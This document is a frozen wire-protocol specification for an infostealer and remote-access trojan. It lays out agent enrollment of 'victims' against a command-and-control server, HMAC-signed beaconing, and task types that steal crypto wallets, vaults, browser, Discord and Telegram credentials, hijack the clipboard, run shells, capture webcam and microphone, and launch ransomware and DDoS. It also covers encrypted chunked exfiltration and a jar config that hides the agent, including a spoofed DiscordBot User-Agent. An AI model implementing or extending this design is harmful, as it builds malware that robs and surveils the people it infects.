# SPC Wire Contract v1 — frozen

Status: **FROZEN**. Owner: both halves. Changes require a `v2` file set, never an in-place edit.
Scope: agent ⇄ SPC Console. Discord stays a degraded fallback and is not part of this contract.

Any implementation decision that needs a field not described here is first added to this
document, then to `openapi.yaml`, then to `task-schemas.json`, and only then to code.

## 0. Constants

| Name | Value |
|---|---|
| Base URL | `https://c2.spc-cloud.net/api/v1` |
| Contract version | `1` (header `X-Contract: 1` on every request) |
| Max body (JSON) | 1 MiB |
| Artifact chunk | 524288 bytes exactly, except the last chunk |
| Max artifact | 512 MiB |
| Clock skew | 300 s |
| Nonce TTL | 900 s |
| Heartbeat | 30 s, ±20 % jitter |
| Task poll | 20 s, ±25 % jitter |
| Task result max | 4 MiB |
| Build secret | 32 random bytes, base64url, embedded in the jar config |
| User-Agent | `DiscordBot (repo, <version>)` while Discord exists, then `SPC-Agent/<version>` |

## 1. Enrollment

`POST /enroll`

```json
{
  "build_token": "<base64url 32 bytes, one per build, hashed at rest>",
  "build_id": "uuid",
  "hostname": "DESKTOP-01",
  "os": "windows|linux|macos",
  "os_version": "10.0.19045",
  "arch": "x86_64|aarch64",
  "username": "alice",
  "agent_version": "0.3.0",
  "profile": "lite|full",
  "modules": ["wallets", "clipboard", "credentials", "seeds"]
}
```

`201`

```json
{
  "victim_id": "uuid",
  "device_token": "<base64url 32 bytes>",
  "server_time": 1767225600,
  "heartbeat_interval": 30,
  "poll_interval": 20,
  "config_version": 1
}
```

Enrollment is idempotent by `build_id + hostname + username`. Re-enrolling returns the same
victim with the existing token rotated. A revoked build answers `403 build_revoked`.

## 2. Request authentication

Every request except `/enroll` carries:

| Header | Content |
|---|---|
| `X-Victim-Id` | victim uuid |
| `X-Timestamp` | unix seconds |
| `X-Nonce` | base64url, ≥ 16 bytes, unique per request |
| `X-Signature` | base64url HMAC-SHA256 |

Canonical string (LF joined, trailing LF):

```
METHOD
/path/without/query
X-Timestamp
X-Nonce
lowercase-hex(sha256(raw body))
```

`X-Signature = HMAC-SHA256(base64url_decode(device_token), canonical)`, base64url unpadded.
Query strings are not signed. `GET` bodies hash the empty string.
Server checks: victim exists, not revoked, `|now - ts| <= 300`, nonce unseen for 900 s,
signature constant-time equal. Failure: `401`, `409 replay`, or `403 revoked`.

## 3. Heartbeat

`POST /hb`

```json
{
  "status": "ok|degraded",
  "uptime_s": 3600,
  "modules": {"wallets": "ok", "clipboard": "ok", "credentials": "error:dpapi"},
  "counters": {"wallets": 4, "seeds": 1, "clip": 12},
  "profile": "lite|full",
  "pending_artifact": "uuid|null",
  "agent_version": "0.3.0"
}
```

`200 {"ok":true,"poll_now":false,"config_version":1}`.
`poll_now` only shortens the next poll to 1 s. The panel derives online state from
`victims.last_heartbeat_at` (stale after 90 s), **never** from the WebSocket.
`410` means revoked: the agent stops and keeps local data.

## 4. Tasks

`GET /tasks?limit=8` → `200`

```json
{"tasks":[{"id":"uuid","name":"scan_wallets","params":{},"timeout_sec":120,"not_before":1767225600}]}
```

Server only returns tasks for this victim in `queued` or expired-`running` state, ordered
`priority DESC, created_at ASC`. Fetching leases a task (`running`, `lease_until = now + timeout`).

`POST /tasks/{id}/result`

```json
{"status":"ok|error|cancelled","error":"nullable","result":{},"artifacts":[{"upload_request":"uuid"}]}
```

`200 {"ok":true}`. Re-posting the same `id` is idempotent (`409 already_finished` if it
differs). Result is capped at 4 MiB; larger output goes as an artifact.

Task names are exactly:

| Name | Params schema | Result schema | Cancellable |
|---|---|---|---|
| `scan_wallets` | `scan_wallets.json` | `scan_result.json` | yes |
| `dump_vault` | `dump_vault.json` | `dump_result.json` | yes |
| `crack_vault` | `crack_vault.json` | `crack_result.json` | yes |
| `clip_start` | `clip_start.json` | `ok_result.json` | yes |
| `clip_stop` | `{}` | `ok_result.json` | yes |
| `shell` | `shell.json` | `shell_result.json` | yes |
| `harvest` | `{}` | `ok_result.json` | yes |
| `screenshot` | `{}` | `artifact_result.json` | yes |
| `file_pull` | `file_pull.json` | `artifact_result.json` | yes |
| `cancel` | `cancel.json` | `ok_result.json` | no |
| `agent` | `agent.json` | `agent_result.json` | yes |
| `monitor` | `monitor.json` | `monitor_result.json` | yes |
| `files` | `files.json` | `files_result.json` | yes |
| `webcam` | `webcam.json` | `artifact_result.json` | yes |
| `mic` | `mic.json` | `artifact_result.json` | yes |
| `ransomware` | `ransomware.json` | `ransomware_result.json` | yes |
| `ddos` | `ddos.json` | `ddos_result.json` | yes |

The last six are additive extensions; existing names and semantics do not change.
`harvest.kind` (`all|browsers|discord|telegram|wifi|productkey`, default `all`) is
likewise additive. Unknown names → `error: unknown_task`. Every handler is sandboxed by the agent module
supervisor: a throw becomes `status:"error"` and never kills heartbeats.

## 5. Artifacts

1. `POST /artifacts` (signed)

```json
{"task_id":"uuid|null","module":"wallets","container_version":1,"total_size":123456,"chunk_count":1,"sha256":"<full container sha256>"}
```

`201 {"upload_id":"uuid","chunk_size":524288,"received":0,"expires_at":1767229200}`

2. `POST /artifacts/{upload_id}/chunk?offset=0` — body raw `application/octet-stream`,
headers `X-Chunk-Sha256`. Server verifies offset equals stored `received_offset`, writes
atomically, advances the offset. `409 offset_mismatch` returns `{"received":N}` and the agent
rewinds. Re-sending an already received chunk is a no-op `200`. Idempotent by
`(upload_id, offset, sha256)`.

3. `POST /artifacts/{upload_id}/commit` `{"sha256":"...","chunk_count":N}` — verifies the whole
container hash, stores it, enqueues `artifact.process`, returns
`200 {"artifact_id":"uuid","status":"queued"}`. Re-commit is idempotent.

Resume: the agent persists `upload_id` and `received_offset` in `cache/crypto/uploads.json`
before the first chunk, so a crash or network cut resumes at the offset from
`GET /artifacts/{upload_id}` → `{"received":N,"state":"open|committed|expired"}`.
An upload expires after 24 h. Duplicate `upload_id` never creates a second artifact because
`commit` is keyed by upload.

## 6. Container

ZIP-free, deterministic, Deflate then AES-256-GCM:

```
manifest.json                 # plaintext, canonical JSON, UTF-8
manifest.json.sha256          # lowercase hex
blobs/<artifact_id>.bin       # deflate(plaintext) then AES-GCM
```

`manifest.json`:

```json
{
  "container_version": 1,
  "build_id": "uuid",
  "victim_id": "uuid",
  "os": "windows",
  "profile": "full",
  "module": "wallets",
  "created_at": 1767225600,
  "artifacts": [
    {"id":"a1","path":"wallets/metamask/000003.log","kind":"leveldb","size":4096,"sha256":"...","mode":384}
  ],
  "total_size": 4096,
  "nonce_prefix": "<base64url 8 bytes>"
}
```

Key derivation:

```
IKM  = utf8(build_secret) || 0x1f || utf8(build_id) || 0x1f || utf8(victim_id)
KEK  = sha256(utf8("SPC-ART-V1") || IKM)
key  = HKDF-SHA256(KEK, salt = nonce_prefix, info = utf8("artifact-v1"), 32)
nonce = nonce_prefix(8) || uint32_be(chunk_index)(4)
AAD  = utf8(manifest.json.sha256 || ":" || artifact_id)
```

Each blob is an independent GCM record, so any chunk can be verified alone. The panel
derives the same key from the stored build secret and victim id. `build_secret` never leaves
the server except in the built jar config.

## 7. Injected config

Resource `serverpackcore/config.json` inside the jar:

```json
{
  "schema": 1,
  "build_id": "uuid",
  "build_secret": "base64url",
  "c2_base": "https://c2.spc-cloud.net/api/v1",
  "profile": "full",
  "modules": {"wallets": true, "clipboard": true, "credentials": true, "seeds": true},
  "bandwidth_kbps": 1024,
  "heartbeat_sec": 30,
  "poll_sec": 20,
  "jitter_pct": 20,
  "crack": {"enabled": true, "max_seconds": 90, "max_cpu_pct": 50},
  "artifact": {"chunk_size": 524288, "max_mb": 512}
}
```

Rules: `build_id` is the same value that derives the artifact key; the build token is
`HMAC-SHA256(build_secret, "enroll")` truncated to 32 bytes, base64url, and stored hashed.
Profile `lite` forces `seeds=false`, `credentials=false`, and caps artifacts at 64 MiB.

## 8. Errors

Error body `{"error":"code","message":"human","retry_after":0}`.

| Code | HTTP | Agent action |
|---|---|---|
| `bad_signature` | 401 | re-enroll |
| `replay` | 409 | new nonce |
| `revoked` | 403 | stop |
| `offset_mismatch` | 409 | read `received`, rewind |
| `upload_expired` | 410 | new upload |
| `rate_limited` | 429 | obey `retry_after` |
| `payload_too_large` | 413 | split or truncate by profile |
| `unknown_task` | 422 | result `error` |

## 9. Panel-only rule

`viewer` may read every page and export. `operator` may enqueue/cancel tasks and trigger
scans. `admin` may also edit builds, victims, operators and secrets. Every mutation writes
`audit_log` in the same transaction.
